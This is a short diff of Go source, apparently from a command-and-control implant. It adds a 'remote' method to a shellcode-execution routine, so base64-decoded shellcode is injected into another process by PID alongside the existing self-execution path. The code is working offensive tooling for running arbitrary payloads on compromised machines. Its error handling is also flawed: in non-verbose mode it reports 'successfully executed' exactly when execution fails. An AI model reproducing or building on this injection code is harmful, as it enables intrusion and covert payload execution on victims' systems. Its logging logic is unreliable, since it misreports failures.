@@ -760,7 +760,7 @@ func (a *Agent) executeCommand(j messages.CmdPayload) (stdout string, stderr str
 func (a *Agent) executeShellcode(shellcode messages.Shellcode) error {
 
 	if a.Debug {
-		message("debug", fmt.Sprintf("Received input parameter for executeShellcode function: %s", shellcode))
+		message("debug", fmt.Sprintf("Received input parameter for executeShellcode function: %v", shellcode))
 	}
 
 	shellcodeBytes, errDecode := base64.StdEncoding.DecodeString(shellcode.Bytes)
@@ -780,7 +780,18 @@ func (a *Agent) executeShellcode(shellcode messages.Shellcode) error {
 		err := ExecuteShellcodeSelf(shellcodeBytes)
 		if err != nil {
 			if a.Verbose {
-				message("warn", fmt.Sprintf("There was an error executing the shellcode: \r\n%s", shellcode))
+				message("warn", fmt.Sprintf("There was an error executing the shellcode: \r\n%s", shellcodeBytes))
+				message("warn", fmt.Sprintf("Error: %s", err.Error()))
+			} else {
+				message("success", "Shellcode was successfully executed")
+			}
+		}
+		return err
+	} else if shellcode.Method == "remote" {
+		err := ExecuteShellcodeRemote(shellcodeBytes, shellcode.PID)
+		if err != nil {
+			if a.Verbose {
+				message("warn", fmt.Sprintf("There was an error executing the shellcode: \r\n%s", shellcodeBytes))
 				message("warn", fmt.Sprintf("Error: %s", err.Error()))
 			} else {
 				message("success", "Shellcode was successfully executed")
